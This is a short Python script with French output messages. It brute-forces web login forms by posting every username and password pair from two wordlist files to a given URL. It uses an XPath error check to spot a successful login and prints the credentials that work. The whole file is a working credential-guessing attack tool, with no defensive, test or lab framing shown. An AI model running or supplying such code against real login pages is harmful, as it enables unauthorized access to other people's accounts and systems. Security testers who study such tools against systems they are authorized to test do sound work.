from bs4 import BeautifulSoup
import requests
from lxml import etree
import time
from datetime import datetime


def getWebSiteData(html_doc):
    soup = BeautifulSoup(html_doc, 'lxml')
    return etree.HTML(str(soup))


def brute_force(url, user_input, pass_input, submit_button, error_xpath, user_list, pass_list):
    combinaison = 0
    start_time = time.time()  # Record the start time
    with open(file=user_list, mode="r") as file1, open(file=pass_list, mode='r') as file2:
        for u in file1:
            username = u.rstrip('\n')
            file2.seek(0)
            for p in file2:
                password = p.rstrip('\n')

                params = {
                    user_input: username,
                    pass_input: password,
                    submit_button: ""
                }

                res = requests.post(url, data=params)

                if res.status_code == 200:
                    combinaison += 1
                    dom = getWebSiteData(res.text)
                    error = dom.xpath(error_xpath)

                    current_time = time.time() - start_time
                    formatted_time = str(datetime.utcfromtimestamp(current_time).strftime('%H:%M:%S'))
                    print(f"\rTemps écoulé : {formatted_time} | Progression : {combinaison} combinaisons testées",
                          end="")
                    if not error:
                        return f'''
                        \n[>] {user_input}: {username}\n[>] {pass_input}: {password}''', current_time, True

                else:
                    return "Request failed"
    end_time = time.time()  # Record the end time
    elapsed_time = end_time - start_time
    return f'''
    \n[>] Aucune correspondance trouvée pour le nom d'utilisateur et le mot de passe dans les dictionnaires fournis.''', elapsed_time, False
